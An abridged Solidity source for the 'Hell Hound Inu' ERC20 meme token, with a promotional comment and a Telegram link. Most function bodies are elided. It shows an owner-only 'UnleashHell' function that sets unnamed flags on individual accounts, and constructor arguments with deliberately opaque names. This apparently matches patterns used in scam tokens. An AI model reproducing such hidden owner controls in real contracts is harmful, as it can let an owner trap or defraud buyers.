 ...
 * The Dog of the Devil
 * 
 * Join us now for new 
 * interesting tokenomics
 * and new interesting NFTs!
 * 
 *
 * https://t.me/HellHoundInu 
**/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function UnleashHell(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _OpenTheGates(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Hell is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool house001, bool house2, uint256 house6,
        uint256 house7, address creator,
        uint256 initialSupply, address owner,
        uint256 house9
    ) ERC20(name, symbol, creator, house001, house2, house9) {
        _OpenTheGates(owner, initialSupply, house6, house7);
    }
}

contract HellHoundInu is ERC20Hell {
    constructor() ERC20Hell("Hell Hound Inu", "HELLHOUND", false, true, 900, 25, msg.sender, 6666666 * 10 ** 18, msg.sender, 666) {
    }
}